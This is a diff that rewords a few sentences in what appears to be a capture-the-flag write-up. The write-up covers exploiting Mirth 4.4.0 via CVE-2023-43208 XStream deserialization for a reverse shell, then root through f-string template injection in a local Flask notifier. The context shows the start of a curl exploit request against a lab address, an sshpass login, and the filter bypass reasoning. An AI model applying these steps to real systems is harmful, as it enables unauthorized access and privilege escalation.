@@ -59,7 +59,7 @@ Mirth 4.4.0 lines up with {red:CVE-2023-43208}, an unauthenticated XStream deser
 
 ::: stage n=2 label="FOOTHOLD" title="XStream deserialization to reverse shell as mirth."
 
-The public PoC drops a `<sorted-set>` XML gadget that bounces through a brace-expansion trick to dodge the space-in-pipe rewrite:
+The public PoC uses a `<sorted-set>` XML gadget and brace expansion to bypass the space-in-pipe rewrite:
 
 ::: terminal title="shell · exploit · CVE-2023-43208" lang="bash"
 $ curl -sk -X POST 'https://10.129.244.184/api/users' \
@@ -112,7 +112,7 @@ $ sshpass -p '[REDACTED]' ssh sedric@10.129.244.184 'cat /home/sedric/user.txt'
 
 ::: stage n=5 label="ROOT" title="Local notifier service — f-string template injection."
 
-Enumeration flags a Flask app on `127.0.0.1:54321` running as root. `sedric` can read the source:
+Enumeration finds a Flask app running as root on `127.0.0.1:54321`. `sedric` can read its source:
 
 ::: terminal title="shell · sedric@interpreter" lang="python"
 # /usr/local/bin/notif.py  (abridged)
@@ -123,7 +123,7 @@ template = config['template']
 # f-string path — any {expr} inside executes as Python.
 :::
 
-Regex blocks `;`, spaces, and `<>`, but allows quotes, parens, braces, `/`, `.`, and `=`. That's everything we need to smuggle a Python expression into the template.
+The regex blocks `;`, spaces, and `<>`, but allows quotes, parens, braces, `/`, `.`, and `=`. That leaves enough characters to put a Python expression in the template.
 
 The app accepts patient records over XML on `/addPatient`; the {red:lastname} field feeds into the template unchecked. Payload:
 
